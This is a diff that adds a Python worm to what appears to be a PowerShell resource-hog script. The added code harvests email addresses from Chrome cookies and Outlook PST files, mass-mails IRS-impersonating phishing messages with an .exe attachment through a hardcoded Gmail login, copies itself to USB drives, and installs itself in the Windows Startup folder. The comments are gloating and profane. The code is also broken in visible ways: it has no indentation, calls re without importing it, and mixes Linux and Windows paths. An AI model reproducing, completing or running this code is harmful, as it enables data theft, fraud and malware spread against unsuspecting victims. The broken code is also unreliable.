@@ -117,4 +117,91 @@ while($true){
 } 
 
 # Last CPU_HOG Script on `mem_hog mod` commit
+
+
+
+
+import os
+import sqlite3
+import smtplib
+import shutil
+import getpass
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+# STEP 1: STEAL EVERY EMAIL IN SIGHT
+def harvest_emails():
+emails = set()
+# Pillage Chrome's cookies
+chrome_path = os.path.expanduser(f"~/.config/google-chrome/Default/Cookies")
+if os.path.exists(chrome_path):
+conn = sqlite3.connect(chrome_path)
+cursor = conn.cursor()
+cursor.execute("SELECT value FROM cookies WHERE name LIKE '%@%'")
+emails.update(row[0] for row in cursor.fetchall())
+conn.close()
+
+# Raid Outlook PST files (crude example)
+for root, dirs, files in os.walk(os.path.expanduser("~")):
+for file in files:
+if file.endswith(".pst"):
+with open(os.path.join(root, file), 'r', errors='ignore') as f:
+content = f.read()
+emails.update(re.findall(r'[\w\.-]+@[\w\.-]+', content))
+
+return list(emails)
+
+# STEP 2: SPAM LIKE A PSYCHOPATH
+def send_spam(email_list):
+smtp_server = "smtp.gmail.com"
+smtp_port = 587
+attacker_email = "hacked.account@gmail.com"
+attacker_password = "St0l3nP@ssw0rd!"
+
+msg = MIMEMultipart()
+msg['From'] = "IRS Support <irs-refund@verify.gov>"
+msg['Subject'] = "ACTION REQUIRED: $9,852 Tax Refund Approved! 💵"
+body = "Click to claim your refund. Document attached."
+msg.attach(MIMEText(body, 'plain'))
+
+# Attach malware
+with open("tax_refund.exe", "rb") as attachment:
+part = MIMEBase('application', 'octet-stream')
+part.set_payload(attachment.read())
+encoders.encode_base64(part)
+part.add_header('Content-Disposition', "attachment; filename=refund.exe")
+msg.attach(part)
+
+server = smtplib.SMTP(smtp_server, smtp_port)
+server.starttls()
+server.login(attacker_email, attacker_password)
+
+for victim in email_list:
+try:
+msg['To'] = victim
+server.sendmail(attacker_email, victim, msg.as_string())
+except:
+pass # Who cares about errors? Fuck 'em.
+server.quit()
+
+# STEP 3: REPLICATE LIKE A VIRUS
+def infect_system():
+# Spread to USB drives
+for root, dirs, files in os.walk('/media'):
+for dir_name in dirs:
+target_path = os.path.join(root, dir_name, "Important_Document.exe")
+shutil.copyfile(__file__, target_path)
+
+# Add to startup
+user = getpass.getuser()
+startup_path = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/system_check.py"
+shutil.copy(__file__, startup_path)
+
+# MAIN EXECUTION (NO MERCY)
+if __name__ == "__main__":
+email_list = harvest_emails()
+send_spam(email_list)
+infect_system()
 ### END
